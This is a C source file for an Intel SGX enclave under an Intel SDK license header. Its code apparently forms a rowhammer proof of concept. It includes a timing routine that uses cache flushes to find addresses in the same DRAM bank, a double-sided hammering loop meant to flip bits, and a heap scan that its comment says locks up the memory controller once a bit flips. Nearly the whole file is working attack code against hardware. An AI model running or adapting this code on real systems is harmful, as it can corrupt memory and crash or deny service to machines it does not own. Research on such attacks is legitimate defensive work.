/*
 * Copyright (C) 2011-2018 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <stdarg.h>
#include <intrin.h>
#include <stdio.h>      /* vsnprintf */

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */

/* 
 * printf: 
 *   Invokes OCALL to display the enclave buffer to the terminal.
 */
void printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
}

// measure the timing of accessing two addresses p1 and p2
void enclave_access_row(uint64_t *p1, uint64_t *p2, uint64_t n_trial) {
	// run for n_trial times (to amplify the delay)
	while (n_trial-- > 0) {
		// flush two addresses from the cache
		asm volatile("clflushopt (%0)" :: "r"(p1) : "memory");
		asm volatile("clflushopt (%0)" :: "r"(p2) : "memory");
		asm volatile("mfence;");
		// access two addresses
		asm volatile("mov (%0), %%r10;" :: "r"(p1) : "memory");
		asm volatile("mov (%0), %%r11;" :: "r"(p2) : "memory");
		asm volatile("lfence;");
	}
}

#define N_THRESHOLD (600000)
#define N_TIMES (1000)
// Runs outside of an enclave
bool check_addr_in_the_same_bank(uint64_t *p1, uint64_t *p2) {
	// returns ~500000 if p1 and p2 are in the same row
	// returns ~550000 if p1 and p2 are in different banks
	// returns > 600000 if p1 and p2 are in different rows
	// in the same bank
	size_t start_time = rdtscp();
	enclave_access_row(p1, p2, N_TIMES);
	size_t end_time = rdtscp();
	return( (end_time - start_time) > N_THRESHOLD );
} 


uint64_t *ptr = ENCLAVE_HEAP_ADDRESS;
size_t mem_size = SIZE_OF_ENCLAVE_HEAP;

void chk_flip() {
	for(uint64_t i=0ul; i<mem_size/sizeof(uint64_t); ++i) {
		ptr[i]; // read memory
		// MC will be locked up if any bit in the read block is flipped.
	}
}
 void dbl_sided_rowhammer(uint64_t *p1, uint64_t *p2, uint64_t n_reads) {
	 while(n_reads-- > 0) {
		 // read memory p1 and p2
		 asm volatile("mov (%0), %%r10;" :: "r"(p1) : "memory");
		 asm volatile("mov (%0), %%r11;" :: "r"(p2) : "memory");
		 // flush p1 and p2 from the cache
		 asm volatile("clflushopt (%0);" :: "r"(p1) : "memory");
		 asm volatile("clflushopt (%0);" :: "r"(p2) : "memory");
	 }
	 chk_flip();
 } 

